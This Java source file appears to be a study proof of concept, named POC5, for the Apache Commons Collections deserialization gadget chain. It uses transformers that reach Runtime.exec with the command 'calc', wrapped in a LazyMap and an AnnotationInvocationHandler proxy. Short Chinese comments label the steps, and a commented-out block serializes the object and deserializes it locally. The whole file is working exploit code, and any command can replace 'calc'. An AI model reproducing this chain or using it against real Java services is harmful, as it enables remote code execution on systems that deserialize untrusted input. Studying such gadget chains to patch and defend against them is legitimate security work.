package org.example.apachecommoncollection;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;

import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.util.HashMap;
import java.util.Map;

public class POC5 {
    public static void main(String[] args) throws Exception{
        Transformer[] transformers_exec = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod",new Class[]{String.class,Class[].class},new Object[]{"getRuntime",null}),
                new InvokerTransformer("invoke",new Class[]{Object.class, Object[].class},new Object[]{null,null}),
                new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"calc"})
        };

        Transformer chain = new ChainedTransformer(transformers_exec);

        HashMap innerMap = new HashMap();
        innerMap.put("value","axin");

        Map lazyMap = LazyMap.decorate(innerMap,chain);
        Class clazz = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor cons = clazz.getDeclaredConstructor(Class.class,Map.class);
        cons.setAccessible(true);
        // 创建LazyMap的handler实例
        InvocationHandler handler = (InvocationHandler) cons.newInstance(Override.class,lazyMap);
        // 创建LazyMap的动态代理实例
        Map mapProxy = (Map)Proxy.newProxyInstance(LazyMap.class.getClassLoader(),LazyMap.class.getInterfaces(), handler);

        // 创建一个AnnotationInvocationHandler实例，并且把刚刚创建的代理赋值给this.memberValues
        InvocationHandler handler1 = (InvocationHandler)cons.newInstance(Override.class, mapProxy);

//        mapProxy.size();

        // 序列化
//        ByteArrayOutputStream baos = new ByteArrayOutputStream();
//        ObjectOutputStream oos = new ObjectOutputStream(baos);
//        oos.writeObject(handler1);
//        oos.flush();
//        oos.close();
//        // 本地模拟反序列化
//        ByteArrayInputStream bais = new ByteArrayInputStream(baos.toByteArray());
//        ObjectInputStream ois = new ObjectInputStream(bais);
//        Object obj = (Object) ois.readObject();
    }
}